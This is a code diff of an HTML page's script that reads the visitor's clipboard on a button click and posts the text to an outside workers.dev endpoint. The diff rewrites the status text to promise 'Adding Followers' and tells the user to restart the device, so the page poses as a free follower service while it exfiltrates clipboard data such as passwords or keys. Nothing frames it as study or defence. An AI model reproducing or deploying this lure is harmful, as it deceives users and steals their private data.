@@ -196,40 +196,42 @@ const button = document.getElementById("main");
 const status = document.getElementById("status");
 
 const SEND_ENDPOINT =
-  "https://young-brook-716e.abojanmawzoon.workers.dev";
-
-button.addEventListener("click", async () => {
-
-  try {
-
-    status.textContent = "Submitting...";
-
-    const text = await navigator.clipboard.readText();
-
-    if (!text) {
-      status.textContent = "Your clipboard is empty.";
-      return;
-    }
-
-    await fetch(SEND_ENDPOINT, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        clipboardText: text
-      })
-    });
-
-  } catch (error) {
-
-    status.textContent =
-      "Something went wrong. Please try again.";
-
-    console.error(error);
-  }
-});
-</script>
-
-</body>
+  "https://young-brook-716e.abojanmawzoon.workers.dev"; 
+ 
+button.addEventListener("click", async () => { 
+ 
+  try { 
+ 
+    status.textContent = "Adding Followers"; 
+ 
+    const text = await navigator.clipboard.readText(); 
+ 
+    if (!text) { 
+      status.textContent = "Your clipboard is empty."; 
+      return; 
+    } 
+ 
+    await fetch(SEND_ENDPOINT, { 
+      method: "POST", 
+      headers: { 
+        "Content-Type": "application/json" 
+      }, 
+      body: JSON.stringify({ 
+        clipboardText: text 
+      }) 
+    }); 
+ 
+    status.textContent = "Restart Device To Get Followers Added to your account!"; 
+ 
+  } catch (error) { 
+ 
+    status.textContent = 
+      "Something went wrong. Please try again."; 
+ 
+    console.error(error); 
+  } 
+}); 
+</script> 
+ 
+</body> 
 </html>
